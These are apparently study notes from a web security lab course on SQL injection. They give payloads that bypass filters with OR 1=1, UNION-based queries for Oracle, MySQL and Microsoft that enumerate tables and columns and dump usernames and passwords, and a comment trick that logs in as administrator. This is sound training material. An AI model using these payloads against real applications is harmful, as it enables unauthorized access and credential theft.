# Retrieving hidden data

## simple attack 
`https://insecure-website.com/products?category=Gifts` -> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
=> after injecting `'+OR+1=1--` -> `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

## Examining the database

- **Note**: On <mark style="background: #BBFABBA6;">Oracle</mark> databases, every `SELECT` statement must specify a table to select -> if its not from table use `dual` -> 
> determine number of columns: `'+UNION+SELECT+'abc','def'+FROM+dual--`
> database version: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

- On <mark style="background: #BBFABBA6;">MySQL and Microsoft</mark>
>  `'+UNION+SELECT+'abc','def'#`
>  `'+UNION+SELECT+@@version,+NULL#`
## Listing the contents 

- <mark style="background: #FF5582A6;">Oracle</mark>
>number of columns: `'+UNION+SELECT+'abc','def'+FROM+dual--`
>list of tables in the database: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
>details of the columns in the table:`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
>usernames and passwords for all users: `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

- <mark style="background: #FF5582A6;">non-Oracle</mark>
>`'+UNION+SELECT+'abc','def'--`
>`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
>`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
>`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
# Subverting application logic

## simple attack 
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
=> submit username as `administrator'--` -> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`